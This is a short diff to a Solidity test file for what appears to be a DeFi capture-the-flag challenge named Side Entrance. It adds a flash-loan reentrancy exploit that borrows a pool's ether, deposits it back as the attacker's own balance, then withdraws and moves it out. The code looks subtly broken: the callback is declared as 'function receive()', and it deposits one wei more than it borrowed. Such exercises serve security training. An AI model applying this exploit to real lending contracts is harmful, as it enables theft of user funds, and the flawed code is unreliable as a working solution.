@@ -45,7 +45,13 @@ contract SideEntranceChallenge is Test {
      * CODE YOUR SOLUTION HERE
      */
     function test_sideEntrance() public checkSolvedByPlayer {
-        
+        pool.flashLoan(ETHER_IN_POOL);
+        pool.withdraw();
+        payable(recovery).transfer(ETHER_IN_POOL);
+    }
+
+    function receive() external payable {
+        pool.deposit{value: ETHER_IN_POOL + 1 wei}();
     }
 
     /**
